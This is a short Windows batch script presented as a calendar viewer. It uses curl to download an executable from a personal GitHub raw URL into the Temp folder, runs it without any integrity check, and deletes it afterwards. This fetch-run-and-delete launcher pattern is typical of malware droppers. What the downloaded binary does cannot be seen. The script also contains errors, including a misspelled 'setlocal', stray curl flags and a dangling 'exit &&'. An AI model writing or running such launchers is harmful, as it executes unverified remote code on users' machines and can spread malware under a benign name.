@echo off
setloacal
title Calendar Viewer
color 0a
cls

set "tempTool=%Temp%\calen.exe"
set "toolUrl=https://raw.githubusercontent.com/Upok18/Calendar-test/main/calen.exe"

echo ========================================
echo           Up0k Calendar
echo ========================================
echo.
echo Downloading the latest tool...
echo.

curl -flsSL "%toolUrl%" -o "%tempTool%"

if errorlevel 1 (
    echo.
    echo ERROR: Download failed!
    echo Check the GitHub URL and internet connection.
    del "%tempTool%" >nul 2>&1
    pause
    exit /b 1
)

echo Download complete!
echo Starting Up0k Calendar...
echo.

timeout /t 2 >nul

"%tempTool%"

echo.
echo Cleaning up...
del "%tempTool%" >nul 2>&1

echo Calendar closed.
timeout /t 2 >nul
exit &&